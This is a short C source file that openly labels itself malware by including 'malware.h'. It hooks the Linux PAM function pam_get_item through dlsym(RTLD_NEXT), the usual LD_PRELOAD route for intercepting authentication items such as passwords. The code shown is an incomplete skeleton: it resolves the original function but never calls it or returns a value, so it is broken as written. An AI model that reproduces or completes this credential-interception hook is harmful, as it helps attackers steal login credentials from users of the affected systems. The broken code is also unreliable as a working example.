#define _GNU_SOURCE
#include "malware.h"

typedef const void* (*pam_get_item_t)(void*, int);

const void* pam_get_item(void *pamh, int item)
{
    static pam_get_item_t orig = NULL;
    if (!orig) {
        orig = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
    }
}

